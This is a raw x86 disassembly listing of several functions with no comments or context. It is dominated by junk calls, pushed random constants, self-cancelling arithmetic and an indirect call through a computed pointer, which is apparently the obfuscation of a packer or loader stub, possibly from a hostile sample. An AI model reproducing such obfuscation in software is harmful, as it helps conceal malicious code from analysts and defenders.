  408e64:	push   0x39
  408e66:	push   0x1a75c700
  408e6b:	call   0x409aad
  408e70:	add    esp,0x10
  408e73:	push   edi
  408e74:	push   0x327f2300
  408e79:	push   0x1662c200
  408e7e:	push   0x34
  408e80:	call   0x409461
  408e85:	add    esp,0xc
  408e88:	push   0xea9bcb00
  408e8d:	push   0xffffffd4
  408e8f:	push   0xffffff9a
  408e91:	push   0x2197800
  408e96:	push   0x5e793a00
  408e9b:	call   0x409461
  408ea0:	add    esp,0x14
  408ea3:	mov    eax,0x50082340
  408ea8:	add    DWORD PTR [ebp-0x28],eax
  408eab:	add    eax,0xaff7ecc0
  408eb0:	mov    ebx,0x18
  408eb5:	cmp    esi,DWORD PTR ds:0x43844c
  408ebb:	je     0x408ecc
  408ebd:	sub    edi,eax
  408ebf:	or     edi,ebx
  408ec1:	mov    ebx,DWORD PTR [ebp-0x28]
  408ec4:	mov    esi,ebx
  408ec6:	add    DWORD PTR [ebp-0x28],esi
  408ec9:	add    DWORD PTR [ebp-0x28],edi
  408ecc:	push   eax
  408ecd:	cmp    esi,0xffffff89
  408ed0:	jne    0x408ee6
  408ed2:	push   0x42
  408ed4:	push   0x1a4d5b00
  408ed9:	push   0x62667400
  408ede:	call   0x409d18
  408ee3:	add    esp,0xc
  408ee6:	push   0x5ba98
  408eeb:	and    edi,ebx
  408eed:	push   0xffffffe4
  408eef:	push   0x33
  408ef1:	push   0x120d3d00
  408ef6:	push   0xffffffe7
  408ef8:	push   0x5
  408efa:	call   0x409967
  408eff:	add    esp,0x14
  408f02:	call   0x409d18
  408f07:	xor    ebx,ebx
  408f09:	cmp    eax,ebx
  408f0b:	je     0x409075
  408f11:	add    DWORD PTR [ebp-0x28],ebx
  408f14:	mov    esi,edi
  408f16:	push   0xffffff81
  408f18:	push   0x42384400
  408f1d:	call   0x409bc5
  408f22:	add    esp,0x8
  408f25:	mov    ebx,DWORD PTR [ebp-0x28]
  408f28:	cmp    ebx,DWORD PTR ds:0x43844c
  408f2e:	je     0x409075
  408f34:	push   0xf28ceb00
  408f39:	push   0x5c
  408f3b:	push   0x24
  408f3d:	push   0xaabafb00
  408f42:	push   0x6a116c00
  408f47:	call   0x40957c
  408f4c:	add    esp,0x14
  408f4f:	call   0x409d18
  408f54:	add    DWORD PTR [ebp-0x28],ebx
  408f57:	push   0xea008800
  408f5c:	call   0x40957c
  408f61:	add    esp,0x4
  408f64:	sub    esi,ebx
  408f66:	push   0xffffff96
  408f68:	push   0x78
  408f6a:	push   0xffffffcb
  408f6c:	push   0x6ab02300
  408f71:	call   0x40957c
  408f76:	add    esp,0x10
  408f79:	mov    edi,DWORD PTR [ebp-0x28]
  408f7c:	push   0x6
  408f7e:	push   0xea54c200
  408f83:	push   0x35
  408f85:	call   0x40957c
  408f8a:	add    esp,0xc
  408f8d:	test   edi,0xb5
  408f93:	jne    0x409075
  408f99:	cmp    edi,DWORD PTR [ebp-0x30]
  408f9c:	jne    0x409075
  408fa2:	push   0x48
  408fa4:	call   0x40957c
  408fa9:	add    esp,0x4
  408fac:	push   0xffffffb1
  408fae:	call   0x409967
  408fb3:	add    esp,0x4
  408fb6:	test   edi,0x7b
  408fbc:	jne    0x409075
  408fc2:	push   0xca278d00
  408fc7:	push   0x65
  408fc9:	push   0xb64fa300
  408fce:	push   0xce398300
  408fd3:	push   0x6af2c300
  408fd8:	call   0x409bc5
  408fdd:	add    esp,0x14
  408fe0:	push   0x75
  408fe2:	call   0x409d18
  408fe7:	add    esp,0x4
  408fea:	call   0x409aad
  408fef:	mov    edx,DWORD PTR ds:0x43844c
  408ff5:	call   0x409aad
  408ffa:	push   0xca13ec00
  408fff:	push   0x26
  409001:	push   0xffffffdc
  409003:	call   0x409d18
  409008:	add    esp,0xc
  40900b:	add    esi,ebx
  40900d:	xor    edx,edx
  40900f:	call   0x409bc5
  409014:	add    esi,esi
  409016:	sub    DWORD PTR [ebp-0x28],edi
  409019:	test   edi,0x70
  40901f:	jne    0x409075
  409021:	push   0x6a602400
  409026:	push   0xffffff86
  409028:	push   0x9602c700
  40902d:	push   0x7a
  40902f:	call   0x40980d
  409034:	add    esp,0x10
  409037:	call   0x409736
  40903c:	mov    ecx,DWORD PTR [ebp-0x28]
  40903f:	call   0x40957c
  409044:	mov    edi,DWORD PTR [ebp-0x28]
  409047:	sub    DWORD PTR [ebp-0x28],esi
  40904a:	add    edi,eax
  40904c:	push   0x69
  40904e:	push   0x7604ef00
  409053:	push   0x209c7b00
  409058:	call   0x40980d
  40905d:	add    esp,0xc
  409060:	push   0xc0905800
  409065:	call   0x409aad
  40906a:	add    esp,0x4
  40906d:	call   0x409bc5
  409072:	and    DWORD PTR [ebp-0x28],edi
  409075:	call   0x409bc5
  40907a:	push   0x0
  40907c:	sub    eax,esi
  40907e:	push   0xffffffc3
  409080:	push   0x36046600
  409085:	push   0xa0e3a00
  40908a:	call   0x409d18
  40908f:	add    esp,0xc
  409092:	mov    esi,0xd29d1e91
  409097:	mov    eax,DWORD PTR [ebp-0x28]
  40909a:	push   0x1a10d800
  40909f:	push   0x6a2e1f00
  4090a4:	push   0x32492f00
  4090a9:	push   0x78
  4090ab:	push   0xffffffb3
  4090ad:	call   0x409bc5
  4090b2:	add    esp,0x14
  4090b5:	sub    esi,0xd2599b3d
  4090bb:	push   0xb6120500
  4090c0:	call   0x409aad
  4090c5:	add    esp,0x4
  4090c8:	push   0x8e62af00
  4090cd:	call   0x409967
  4090d2:	add    esp,0x4
  4090d5:	call   DWORD PTR [esi]
  4090d7:	xor    ebx,ebx
  4090d9:	add    ebx,ebx
  4090db:	mov    esi,DWORD PTR ds:0x43844c
  4090e1:	or     ebx,eax
  4090e3:	cmp    ebx,DWORD PTR [ebp-0x18]
  4090e6:	je     0x409121
  4090e8:	mov    edx,DWORD PTR [ebp-0x28]
  4090eb:	test   edx,0x47e5
  4090f1:	je     0x409121
  4090f3:	xor    edi,edi
  4090f5:	mov    ecx,0x4
  4090fa:	and    ebx,eax
  4090fc:	add    ebx,eax
  4090fe:	sub    DWORD PTR [ebp-0x28],edx
  409101:	sub    DWORD PTR [ebp-0x28],ebx
  409104:	and    DWORD PTR [ebp-0x28],edi
  409107:	add    DWORD PTR [ebp-0x28],ecx
  40910a:	cmp    ebx,ecx
  40910c:	jne    0x40911e
  40910e:	mov    ecx,0x54
  409113:	mov    edi,0x55
  409118:	and    DWORD PTR [ebp-0x28],ecx
  40911b:	or     DWORD PTR [ebp-0x28],edi
  40911e:	add    DWORD PTR [ebp-0x28],esi
  409121:	mov    DWORD PTR [ebp-0x20],eax
  409124:	add    ebx,eax
  409126:	add    DWORD PTR [ebp-0x28],ebx
  409129:	push   0xffffff99
  40912b:	push   0xb0cad200
  409130:	call   0x409aad
  409135:	add    esp,0x8
  409138:	mov    ebx,0xf248bdf0
  40913d:	call   0x40957c
  409142:	push   0xa074200
  409147:	push   0x78
  409149:	push   0x421bbe00
  40914e:	push   0xee715500
  409153:	call   0x40980d
  409158:	add    esp,0x10
  40915b:	add    ebx,0xdfac210
  409161:	push   0xa4a9900
  409166:	push   0x52a21200
  40916b:	call   0x409d18
  409170:	add    esp,0x8
  409173:	mov    DWORD PTR [ebp-0x1c],ebx
  409176:	mov    edi,eax
  409178:	mov    eax,DWORD PTR [ebp-0x28]
  40917b:	call   0x409bc5
  409180:	and    edi,eax
  409182:	add    DWORD PTR [ebp-0x28],edi
  409185:	push   0xffffff9a
  409187:	call   0x409967
  40918c:	add    esp,0x4
  40918f:	mov    edi,DWORD PTR [ebp-0x20]
  409192:	push   0xffffff85
  409194:	push   0xaaa4ba00
  409199:	push   0x1e
  40919b:	push   0x80b99400
  4091a0:	push   0xf2fc6200
  4091a5:	call   0x409bc5
  4091aa:	add    esp,0x14
  4091ad:	push   0x6ab40f00
  4091b2:	push   0x6083be00
  4091b7:	push   0x37
  4091b9:	call   0x40980d
  4091be:	add    esp,0xc
  4091c1:	mov    edx,DWORD PTR [ebp-0x1c]
  4091c4:	cmp    edi,eax
  4091c6:	je     0x40922a
  4091c8:	mov    esi,DWORD PTR [ebp-0x28]
  4091cb:	cmp    edx,0xf2a0
  4091d1:	jne    0x40922a
  4091d3:	mov    ecx,DWORD PTR [ebp-0x28]
  4091d6:	cmp    edx,0x74
  4091d9:	je     0x40922a
  4091db:	add    DWORD PTR [ebp-0x28],esi
  4091de:	cmp    edx,edi
  4091e0:	je     0x40922a
  4091e2:	test   edi,0x2bf5
  4091e8:	je     0x40922a
  4091ea:	and    ecx,eax
  4091ec:	cmp    ecx,0xffffffdf
  4091ef:	jne    0x40922a
  4091f1:	mov    esi,0xc5
  4091f6:	and    DWORD PTR [ebp-0x28],edx
  4091f9:	cmp    ecx,DWORD PTR [ebp-0x30]
  4091fc:	jne    0x40922a
  4091fe:	mov    ebx,DWORD PTR [ebp-0x28]
  409201:	cmp    ebx,DWORD PTR [ebp-0x24]
  409204:	jne    0x40922a
  409206:	sub    DWORD PTR [ebp-0x28],ecx
  409209:	mov    eax,DWORD PTR [ebp-0x28]
  40920c:	cmp    edi,0x808223
  409212:	jne    0x40922a
  409214:	sub    ebx,edi
  409216:	mov    ecx,DWORD PTR [ebp-0x28]
  409219:	xor    DWORD PTR [ebp-0x28],ecx
  40921c:	xor    DWORD PTR [ebp-0x28],eax
  40921f:	mov    eax,ecx
  409221:	sub    DWORD PTR [ebp-0x28],eax
  409224:	mov    DWORD PTR [ebp-0x28],esi
  409227:	and    DWORD PTR [ebp-0x28],ebx
  40922a:	mov    esi,DWORD PTR [edx]
  40922c:	add    DWORD PTR [ebp-0x28],esi
  40922f:	mov    ecx,DWORD PTR [edx+0x4]
  409232:	add    ebx,edi
  409234:	sub    ebx,ecx
  409236:	and    ebx,eax
  409238:	and    ebx,eax
  40923a:	cmp    ebx,0x55b4
  409240:	jne    0x409296
  409242:	or     ebx,ecx
  409244:	and    ebx,ecx
  409246:	cmp    edi,DWORD PTR ds:0x43844c
  40924c:	jne    0x409296
  40924e:	xor    eax,eax
  409250:	cmp    esi,DWORD PTR ds:0x43844c
  409256:	jne    0x409296
  409258:	and    DWORD PTR [ebp-0x28],ecx
  40925b:	mov    edx,0x63
  409260:	cmp    ebx,edi
  409262:	je     0x409296
  409264:	sub    DWORD PTR [ebp-0x28],eax
  409267:	add    ebx,edx
  409269:	mov    edx,DWORD PTR [ebp-0x28]
  40926c:	mov    eax,0xb6de
  409271:	cmp    edx,DWORD PTR [ebp-0x4]
  409274:	jne    0x409296
  409276:	add    DWORD PTR [ebp-0x28],ebx
  409279:	and    edx,edi
  40927b:	sub    DWORD PTR [ebp-0x28],edx
  40927e:	mov    ebx,0xf7
  409283:	and    ebx,edx
  409285:	add    eax,ebx
  409287:	add    DWORD PTR [ebp-0x28],edi
  40928a:	and    eax,esi
  40928c:	sub    eax,ebx
  40928e:	and    eax,esi
  409290:	add    DWORD PTR [ebp-0x28],edx
  409293:	sub    DWORD PTR [ebp-0x28],eax
  409296:	or     esi,esi
  409298:	je     0x4093da
  40929e:	and    edx,ecx
  4092a0:	cmp    edx,0x7258
  4092a6:	je     0x4092c9
  4092a8:	sub    edx,esi
  4092aa:	mov    eax,DWORD PTR [ebp-0x28]
  4092ad:	cmp    ebx,0x6
  4092b0:	je     0x4092c9
  4092b2:	sub    DWORD PTR [ebp-0x28],eax
  4092b5:	add    edx,eax
  4092b7:	sub    edx,esi
  4092b9:	cmp    edx,DWORD PTR [ebp-0x8]
  4092bc:	je     0x4092c9
  4092be:	test   edx,0x55
  4092c4:	je     0x4092c9
  4092c6:	sub    DWORD PTR [ebp-0x28],edx
  4092c9:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092cb:	push   0xea8db900
  4092d0:	call   0x409967
  4092d5:	add    esp,0x4
  4092d8:	push   0x5f
  4092da:	push   0x44
  4092dc:	push   0x467e5200
  4092e1:	push   0x20c0ec00
  4092e6:	push   0xde22cb00
  4092eb:	call   0x40980d
  4092f0:	add    esp,0x14
  4092f3:	sub    esi,ebx
  4092f5:	sub    esi,edi
  4092f7:	push   0xf
  4092f9:	push   0xf0eae400
  4092fe:	call   0x409461
  409303:	add    esp,0x8
  409306:	mov    eax,0xa70
  40930b:	add    esi,ebx
  40930d:	add    esi,ebx
  40930f:	mov    edx,DWORD PTR [ebp-0x28]
  409312:	test   esi,0x4e
  409318:	je     0x4093b0
  40931e:	or     esi,edx
  409320:	push   0xd0a57900
  409325:	call   0x409736
  40932a:	add    esp,0x4
  40932d:	call   0x409967
  409332:	mov    eax,DWORD PTR [ebp-0x28]
  409335:	push   0x26c3f00
  40933a:	call   0x409d18
  40933f:	add    esp,0x4
  409342:	mov    ecx,DWORD PTR [ebp-0x28]
  409345:	push   0x2c
  409347:	call   0x409967
  40934c:	add    esp,0x4
  40934f:	push   0x46
  409351:	call   0x409461
  409356:	add    esp,0x4
  409359:	push   0xfffffff8
  40935b:	push   0x7247c900
  409360:	push   0x52be1600
  409365:	push   0x65
  409367:	call   0x409967
  40936c:	add    esp,0x10
  40936f:	push   0xffffff9f
  409371:	push   0x8a3f7f00
  409376:	push   0x16
  409378:	push   0x6ae14d00
  40937d:	push   0x70901400
  409382:	call   0x40980d
  409387:	add    esp,0x14
  40938a:	push   0x2b
  40938c:	call   0x409bc5
  409391:	add    esp,0x4
  409394:	push   0xea82ac00
  409399:	push   0xa2ed400
  40939e:	push   0x54
  4093a0:	call   0x409461
  4093a5:	add    esp,0xc
  4093a8:	call   0x409d18
  4093ad:	sub    DWORD PTR [ebp-0x28],esi
  4093b0:	push   0x46045300
  4093b5:	push   0x27
  4093b7:	call   0x409967
  4093bc:	add    esp,0x8
  4093bf:	add    DWORD PTR [ebp-0x1c],0x8
  4093c3:	add    eax,ebx
  4093c5:	cmp    eax,DWORD PTR ds:0x43844c
  4093cb:	jne    0x4093d5
  4093cd:	cmp    eax,0xffffffa3
  4093d0:	je     0x4093d5
  4093d2:	or     DWORD PTR [ebp-0x28],eax
  4093d5:	jmp    0x409192
  4093da:	test   edx,0x3d
  4093e0:	je     0x4093ec
  4093e2:	push   0x37
  4093e4:	call   0x409967
  4093e9:	add    esp,0x4
  4093ec:	push   0xfe2bc500
  4093f1:	push   0xe633a500
  4093f6:	push   0x66009800
  4093fb:	push   0x5239e400
  409400:	push   0xc2291c00
  409405:	call   0x409bc5
  40940a:	add    esp,0x14
  40940d:	mov    eax,DWORD PTR [ebp-0x20]
  409410:	xor    esi,esi
  409412:	mov    edi,esi
  409414:	sub    edi,eax
  409416:	sub    edi,eax
  409418:	sub    edi,eax
  40941a:	and    edi,eax
  40941c:	and    edi,esi
  40941e:	sub    DWORD PTR [ebp-0x28],edi
  409421:	add    esi,esi
  409423:	add    DWORD PTR [ebp-0x28],esi
  409426:	pop    edi
  409427:	mov    esi,DWORD PTR ds:0x43844c
  40942d:	mov    edx,0x3800
  409432:	cmp    eax,0x73
  409435:	je     0x40944f
  409437:	xor    ebx,ebx
  409439:	add    DWORD PTR [ebp-0x28],ebx
  40943c:	xor    ecx,ecx
  40943e:	and    esi,ecx
  409440:	sub    DWORD PTR [ebp-0x28],edi
  409443:	add    DWORD PTR [ebp-0x28],edi
  409446:	and    esi,edx
  409448:	or     esi,edi
  40944a:	sub    esi,edi
  40944c:	add    DWORD PTR [ebp-0x28],esi
  40944f:	pop    esi
  409450:	sub    DWORD PTR [ebp-0x28],esi
  409453:	pop    ebx
  409454:	mov    edx,DWORD PTR [ebp-0x28]
  409457:	add    DWORD PTR [ebp-0x28],edx
  40945a:	leave  
  40945b:	ret    
  40945c:	int3   
  40945d:	int3   
  40945e:	int3   
  40945f:	int3   
  409460:	int3   
  409461:	push   ebp
  409462:	mov    ebp,esp
  409464:	sub    esp,0x38
  409467:	push   0x30eb6d00
  40946c:	push   0x70f71600
  409471:	push   0x50
  409473:	call   0x409aad
  409478:	add    esp,0xc
  40947b:	push   0xffffffdf
  40947d:	push   0x38
  40947f:	push   0x71
  409481:	push   0xa
  409483:	call   0x409d18
  409488:	add    esp,0x10
  40948b:	push   ebx
  40948c:	push   0x6ad29000
  409491:	push   0xffffffbc
  409493:	push   0x60bf7e00
  409498:	push   0xc617e700
  40949d:	call   0x409aad
  4094a2:	add    esp,0x10
  4094a5:	push   esi
  4094a6:	push   0x52147600
  4094ab:	push   0xf2ebaa00
  4094b0:	push   0x29
  4094b2:	push   0xffffffda
  4094b4:	call   0x409d18
  4094b9:	add    esp,0x10
  4094bc:	push   edi
  4094bd:	push   0x6e553800
  4094c2:	push   0xffffffac
  4094c4:	push   0x74
  4094c6:	push   0xffffff8b
  4094c8:	call   0x409bc5
  4094cd:	add    esp,0x10
  4094d0:	push   0xea87bf00
  4094d5:	push   0xfffffff7
  4094d7:	push   0xe225ea00
  4094dc:	push   0x72727400
  4094e1:	call   0x409d18
  4094e6:	add    esp,0x10
  4094e9:	mov    DWORD PTR [ebp-0x8],eax
  4094ec:	push   0x52c8af00
  4094f1:	push   0xfffffff5
  4094f3:	push   0x62490200
  4094f8:	call   0x409aad
  4094fd:	add    esp,0xc
  409500:	push   0xffffffc5
  409502:	call   0x409aad
  409507:	add    esp,0x4
  40950a:	mov    edx,DWORD PTR [ebp-0x8]
  40950d:	mov    edi,DWORD PTR [ebp-0x8]
  409510:	sub    edx,edi
  409512:	push   0xffffffd7
  409514:	push   0x2a92cd00
  409519:	call   0x409bc5
  40951e:	add    esp,0x8
  409521:	call   0x409bc5
  409526:	pop    edi
  409527:	add    eax,edi
  409529:	call   0x409d18
  40952e:	push   0x3f
  409530:	push   0x56772b00
  409535:	push   0xfffffff6
  409537:	push   0xaa8b2800
  40953c:	call   0x409d18
  409541:	add    esp,0x10
  409544:	pop    esi
  409545:	mov    eax,DWORD PTR [ebp-0x8]
  409548:	cmp    eax,0x1c
  40954b:	jne    0x40955d
  40954d:	mov    ecx,DWORD PTR [ebp-0x8]
  409550:	push   0x3e155700
  409555:	call   0x409aad
  40955a:	add    esp,0x4
  40955d:	pop    ebx
  40955e:	or     DWORD PTR [ebp-0x8],ebx
  409561:	push   0x4a46b700
  409566:	push   0x54
  409568:	push   0xf6758e00
  40956d:	call   0x409bc5
  409572:	add    esp,0xc
  409575:	leave  
  409576:	ret    
  409577:	int3   
  409578:	int3   
  409579:	int3   
  40957a:	int3   
  40957b:	int3   
  40957c:	push   ebp
  40957d:	mov    ebp,esp
  40957f:	sub    esp,0x28
  409582:	push   0x29
  409584:	push   0xffffff84
  409586:	push   0xead6d300
  40958b:	push   0x3265a700
  409590:	call   0x409aad
  409595:	add    esp,0x10
  409598:	push   ebx
  409599:	push   0xffffffbd
  40959b:	push   0xe570a00
  4095a0:	push   0x61
  4095a2:	push   0x9
  4095a4:	call   0x409d18
  4095a9:	add    esp,0x10
  4095ac:	push   0x78
  4095ae:	push   0xa613d800
  4095b3:	push   0xffffff97
  4095b5:	push   0x60
  4095b7:	push   0x46000000
  4095bc:	call   0x409d18
  4095c1:	add    esp,0x14
  4095c4:	push   esi
  4095c5:	cmp    eax,0x47
  4095c8:	je     0x409641
  4095ca:	mov    ebx,eax
  4095cc:	mov    ecx,0x98
  4095d1:	call   0x409bc5
  4095d6:	call   0x409aad
  4095db:	push   0x1
  4095dd:	push   0x5a
  4095df:	call   0x409bc5
  4095e4:	add    esp,0x8
  4095e7:	push   0x47
  4095e9:	push   0x52507c00
  4095ee:	push   0xffffffe4
  4095f0:	push   0xb0aefc00
  4095f5:	push   0x6252e800
  4095fa:	call   0x409aad
  4095ff:	add    esp,0x14
  409602:	cmp    ebx,eax
  409604:	je     0x409641
  409606:	add    ebx,ebx
  409608:	push   0xffffffc1
  40960a:	push   0x6acfcc00
  40960f:	push   0xd0aaf700
  409614:	call   0x409aad
  409619:	add    esp,0xc
  40961c:	push   0x46378b00
  409621:	push   0xffffffcf
  409623:	call   0x409d18
  409628:	add    esp,0x8
  40962b:	xor    eax,eax
  40962d:	mov    ecx,0xd3d2
  409632:	mov    DWORD PTR [ebp-0x1c],ebx
  409635:	sub    DWORD PTR [ebp-0x1c],ebx
  409638:	add    ecx,eax
  40963a:	sub    ecx,eax
  40963c:	call   0x409d18
  409641:	push   edi
  409642:	add    ebx,ebx
  409644:	push   0xe
  409646:	push   0x524c1500
  40964b:	push   0xffffff84
  40964d:	push   0xffffffc6
  40964f:	call   0x409bc5
  409654:	add    esp,0x10
  409657:	mov    DWORD PTR [ebp-0x20],ebx
  40965a:	call   0x409d18
  40965f:	cmp    eax,ebx
  409661:	je     0x409670
  409663:	mov    edx,DWORD PTR [ebp-0x20]
  409666:	push   0xffffffaa
  409668:	call   0x409d18
  40966d:	add    esp,0x4
  409670:	call   0x409bc5
  409675:	push   0xffffffb5
  409677:	push   0x51
  409679:	call   0x409d18
  40967e:	add    esp,0x8
  409681:	cmp    ebx,eax
  409683:	jne    0x409699
  409685:	push   0x51
  409687:	push   0x1243eb00
  40968c:	push   0x7e4e4500
  409691:	call   0x409d18
  409696:	add    esp,0xc
  409699:	push   0xffffff8f
  40969b:	push   0x9e300800
  4096a0:	push   0xc
  4096a2:	push   0x1600cb00
  4096a7:	push   0xe22f700
  4096ac:	call   0x409aad
  4096b1:	add    esp,0x14
  4096b4:	push   0xd2ec4c00
  4096b9:	push   0x16757700
  4096be:	call   0x409aad
  4096c3:	add    esp,0x8
  4096c6:	push   0x78
  4096c8:	push   0xffffffb9
  4096ca:	push   0x67
  4096cc:	push   0xffffff90
  4096ce:	call   0x409aad
  4096d3:	add    esp,0x10
  4096d6:	push   0x42
  4096d8:	push   0x72491a00
  4096dd:	call   0x409bc5
  4096e2:	add    esp,0x8
  4096e5:	pop    edi
  4096e6:	or     DWORD PTR [ebp-0x20],ebx
  4096e9:	push   0x7a595800
  4096ee:	call   0x409bc5
  4096f3:	add    esp,0x4
  4096f6:	pop    esi
  4096f7:	sub    eax,ebx
  4096f9:	push   0x466cb500
  4096fe:	push   0xfffffff6
  409700:	call   0x409d18
  409705:	add    esp,0x8
  409708:	pop    ebx
  409709:	push   0xf2cbe300
  40970e:	push   0x56
  409710:	push   0xffffff8b
  409712:	push   0x40
  409714:	push   0xaaf39d00
  409719:	call   0x409aad
  40971e:	add    esp,0x14
  409721:	push   0xffffff97
  409723:	push   0x35
  409725:	push   0x56
  409727:	call   0x409d18
  40972c:	add    esp,0xc
  40972f:	leave  
  409730:	ret    
  409731:	int3   
  409732:	int3   
  409733:	int3   
  409734:	int3   
  409735:	int3   
  409736:	push   ebp
  409737:	mov    ebp,esp
  409739:	sub    esp,0x38
  40973c:	push   0x35
  40973e:	push   0xffffffdd
  409740:	push   0xffffffe0
  409742:	call   0x409aad
  409747:	add    esp,0xc
  40974a:	push   0xffffffbf
  40974c:	push   0xffffffe4
  40974e:	push   0x80aa0800
  409753:	call   0x409bc5
  409758:	add    esp,0xc
  40975b:	push   ebx
  40975c:	push   0x86792a00
  409761:	push   0x30
  409763:	push   0xffffff9c
  409765:	push   0x2a0ff300
  40976a:	call   0x409bc5
  40976f:	add    esp,0x10
  409772:	push   esi
  409773:	mov    eax,DWORD PTR ds:0x438440
  409779:	push   0xffffffe9
  40977b:	push   0xc6730200
  409780:	push   0xeadb6100
  409785:	push   0x5649de00
  40978a:	push   0xfffffff6
  40978c:	call   0x409d18
  409791:	add    esp,0x14
  409794:	push   edi
  409795:	call   0x409d18
  40979a:	mov    eax,DWORD PTR ds:0x438440
  4097a0:	call   0x409bc5
  4097a5:	push   0x49
  4097a7:	push   0x49
  4097a9:	push   0x53
  4097ab:	push   0x43
  4097ad:	push   0xf2e22a00
  4097b2:	call   0x409d18
  4097b7:	add    esp,0x14
  4097ba:	mov    DWORD PTR [ebp-0x24],eax
  4097bd:	push   0x2192700
  4097c2:	push   0x5e426a00
  4097c7:	push   0x52da6100
  4097cc:	push   0xffffffb5
  4097ce:	call   0x409bc5
  4097d3:	add    esp,0x10
  4097d6:	pop    edi
  4097d7:	call   0x409bc5
  4097dc:	push   0xffffff91
  4097de:	call   0x409aad
  4097e3:	add    esp,0x4
  4097e6:	pop    esi
  4097e7:	push   0x2e
  4097e9:	push   0xffffffb9
  4097eb:	call   0x409bc5
  4097f0:	add    esp,0x8
  4097f3:	call   0x409aad
  4097f8:	pop    ebx
  4097f9:	push   0xf34300
  4097fe:	call   0x409aad
  409803:	add    esp,0x4
  409806:	leave  
  409807:	ret    
  409808:	int3   
  409809:	int3   
  40980a:	int3   
  40980b:	int3   
  40980c:	int3   
  40980d:	push   ebp
  40980e:	mov    ebp,esp
  409810:	sub    esp,0x34
  409813:	call   0x409bc5
  409818:	push   0xaab46100
  40981d:	call   0x409aad
  409822:	add    esp,0x4
  409825:	push   ebx
  409826:	mov    DWORD PTR [ebp-0x2c],eax
  409829:	push   esi
  40982a:	push   0xffffffa7
  40982c:	push   0x9
  40982e:	push   0xffffffc6
  409830:	push   0x64
  409832:	call   0x409aad
  409837:	add    esp,0x10
  40983a:	push   edi
  40983b:	mov    DWORD PTR [ebp-0x34],eax
  40983e:	push   0x4a
  409840:	push   0xd2ee7100
  409845:	call   0x409bc5
  40984a:	add    esp,0x8
  40984d:	push   0xffffffa9
  40984f:	push   0xfa183a00
  409854:	call   0x409aad
  409859:	add    esp,0x8
  40985c:	push   0xd2d4bd00
  409861:	call   0x409bc5
  409866:	add    esp,0x4
  409869:	push   0xda6bae00
  40986e:	push   0xaa990200
  409873:	push   0xb274ae00
  409878:	call   0x409bc5
  40987d:	add    esp,0xc
  409880:	xor    esi,esi
  409882:	push   0x3653f700
  409887:	call   0x409d18
  40988c:	add    esp,0x4
  40988f:	mov    ebx,DWORD PTR [ebp-0x34]
  409892:	cmp    ebx,0xea73
  409898:	je     0x4098f7
  40989a:	mov    edx,0xba8c
  40989f:	push   0x867cea00
  4098a4:	push   0x654ff00
  4098a9:	push   0xe4c6200
  4098ae:	call   0x409d18
  4098b3:	add    esp,0xc
  4098b6:	push   0xffffffc5
  4098b8:	push   0x52ed7a00
  4098bd:	push   0xea87e100
  4098c2:	call   0x409aad
  4098c7:	add    esp,0xc
  4098ca:	push   0xffffff99
  4098cc:	push   0xa
  4098ce:	push   0xffffffd8
  4098d0:	call   0x409aad
  4098d5:	add    esp,0xc
  4098d8:	call   0x409d18
  4098dd:	mov    eax,esi
  4098df:	push   0xffffffbb
  4098e1:	push   0xffffffb5
  4098e3:	push   0xffffffb7
  4098e5:	call   0x409aad
  4098ea:	add    esp,0xc
  4098ed:	sub    ebx,esi
  4098ef:	call   0x409aad
  4098f4:	sub    DWORD PTR [ebp-0x2c],ebx
  4098f7:	push   0xffffffd5
  4098f9:	push   0xffffffdc
  4098fb:	push   0xa0b0de00
  409900:	push   0xffffffcb
  409902:	push   0x762a4400
  409907:	call   0x409bc5
  40990c:	add    esp,0x14
  40990f:	push   0x41
  409911:	push   0x46054500
  409916:	call   0x409bc5
  40991b:	add    esp,0x8
  40991e:	mov    edx,DWORD PTR [ebp-0x34]
  409921:	or     DWORD PTR [ebp-0x34],edx
  409924:	pop    edi
  409925:	push   0x52ea0d00
  40992a:	push   0xffffffc3
  40992c:	push   0xffffffa7
  40992e:	call   0x409aad
  409933:	add    esp,0xc
  409936:	pop    esi
  409937:	push   0xffffffbc
  409939:	push   0x9a096b00
  40993e:	push   0x4c
  409940:	push   0x6acc3b00
  409945:	call   0x409aad
  40994a:	add    esp,0x10
  40994d:	pop    ebx
  40994e:	push   0x7a230e00
  409953:	push   0xe0991e00
  409958:	call   0x409aad
  40995d:	add    esp,0x8
  409960:	leave  
  409961:	ret    
  409962:	int3   
  409963:	int3   
  409964:	int3   
  409965:	int3   
  409966:	int3   
  409967:	push   ebp
  409968:	mov    ebp,esp
  40996a:	sub    esp,0x2c
  40996d:	push   0x36039900
  409972:	push   0x6f
  409974:	push   0xffffffb8
  409976:	call   0x409bc5
  40997b:	add    esp,0xc
  40997e:	push   ebx
  40997f:	mov    DWORD PTR [ebp-0x1c],eax
  409982:	push   esi
  409983:	push   0xffffffb6
  409985:	call   0x409d18
  40998a:	add    esp,0x4
  40998d:	push   edi
  40998e:	mov    edi,DWORD PTR [ebp-0x1c]
  409991:	push   0xaad04c00
  409996:	call   0x409d18
  40999b:	add    esp,0x4
  40999e:	test   edi,0xb4
  4099a4:	jne    0x4099a9
  4099a6:	add    DWORD PTR [ebp-0x1c],edi
  4099a9:	call   0x409aad
  4099ae:	push   0x4a48b400
  4099b3:	call   0x409bc5
  4099b8:	add    esp,0x4
  4099bb:	push   0xaaf63700
  4099c0:	push   0xca142000
  4099c5:	push   0x2aa2fd00
  4099ca:	call   0x409d18
  4099cf:	add    esp,0xc
  4099d2:	mov    edi,DWORD PTR [ebp-0x1c]
  4099d5:	call   0x409bc5
  4099da:	push   0xe0989800
  4099df:	call   0x409aad
  4099e4:	add    esp,0x4
  4099e7:	push   0x2c
  4099e9:	push   0xa0f5f800
  4099ee:	push   0x33
  4099f0:	push   0xe
  4099f2:	call   0x409bc5
  4099f7:	add    esp,0x10
  4099fa:	mov    ecx,DWORD PTR [ebp-0x1c]
  4099fd:	push   0xaa975100
  409a02:	call   0x409aad
  409a07:	add    esp,0x4
  409a0a:	sub    DWORD PTR [ebp-0x1c],edi
  409a0d:	cmp    edi,0x4b
  409a10:	jne    0x409a1c
  409a12:	push   0x3f
  409a14:	call   0x409aad
  409a19:	add    esp,0x4
  409a1c:	push   0xae501300
  409a21:	push   0xffffffcd
  409a23:	push   0x621bef00
  409a28:	push   0xf2ccff00
  409a2d:	push   0xd
  409a2f:	call   0x409d18
  409a34:	add    esp,0x14
  409a37:	sub    eax,edi
  409a39:	push   0x266c5a00
  409a3e:	push   0xffffffe0
  409a40:	push   0xffffffc9
  409a42:	push   0xaa490700
  409a47:	call   0x409d18
  409a4c:	add    esp,0x10
  409a4f:	pop    edi
